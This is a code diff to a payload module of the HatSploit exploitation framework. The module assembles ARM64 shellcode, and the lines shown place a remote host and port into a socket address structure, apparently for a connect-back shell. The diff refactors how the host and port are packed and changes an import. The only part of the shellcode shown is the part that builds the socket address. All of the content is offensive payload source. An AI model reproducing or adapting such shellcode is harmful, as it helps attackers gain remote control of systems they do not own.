@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.assembler import Assembler
 from pex.socket import Socket
 
@@ -26,9 +26,6 @@ class HatSploitPayload(Payload, Assembler, Socket):
         }
 
     def run(self):
-        rhost = self.pack_host(self.handler['RHOST'])
-        rport = self.pack_port(self.handler['RPORT'])
-
         return self.assemble(
             self.details['Architecture'],
             f"""
@@ -41,9 +38,9 @@ class HatSploitPayload(Payload, Assembler, Socket):
 
                 mvn x4, x0
                 lsl x1, x1, 0x1
-                movk x1, 0x{rport.hex()}, lsl 0x10
-                movk x1, 0x{rhost[2:].hex()}, lsl 0x20
-                movk x1, 0x{rhost[:2].hex()}, lsl 0x30
+                movk x1, 0x{self.rport.little.hex()}, lsl 0x10
+                movk x1, 0x{self.rhost.little[2:].hex()}, lsl 0x20
+                movk x1, 0x{self.rhost.little[:2].hex()}, lsl 0x30
                 str x1, [sp, -8]!
                 add x1, sp, x2
                 mov x2, 0x10
